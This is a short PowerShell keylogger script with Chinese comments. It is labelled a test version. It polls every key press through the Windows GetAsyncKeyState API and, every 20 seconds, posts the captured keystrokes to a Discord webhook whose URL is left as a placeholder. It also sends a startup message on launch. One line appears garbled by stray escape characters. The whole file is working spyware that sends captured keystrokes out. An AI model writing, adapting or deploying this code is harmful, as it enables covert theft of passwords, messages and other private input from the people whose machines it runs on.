# 測試用 keylogger.ps1 - 輪詢版本 + 強制測試輸出
$webhook = "https://discord.com/api/webhooks/您的Webhook網址"

$logBuffer = ""
$lastSend = Get-Date

Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition @"
[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
"@ -Name Keyboard -Namespace API

# 立即發送測試訊息（確認腳本運行）
`\(test = @{content="腳本啟動測試：\)`(Get-Date)"} | ConvertTo-Json -Compress
Invoke-RestMethod -Uri $webhook -Method Post -Body $test -ContentType 'application/json'

while ($true) {
    Start-Sleep -Milliseconds 10
    for ($key=8; $key -le 254; $key++) {
        if ([API.Keyboard]::GetAsyncKeyState($key) -eq -32767) {
            $char = switch($key){
                8 {"[BKSP]"} 9 {"[TAB]"} 13 {"[ENTER]"} 32 {" "} default {[char]$key}
            }
            $logBuffer += $char
        }
    }

    if ($logBuffer -and ((Get-Date)-$lastSend).TotalSeconds -ge 20) {
        $payload = @{content="記錄: $logBuffer"} | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'
        $logBuffer = ""
        $lastSend = Get-Date
    }
}
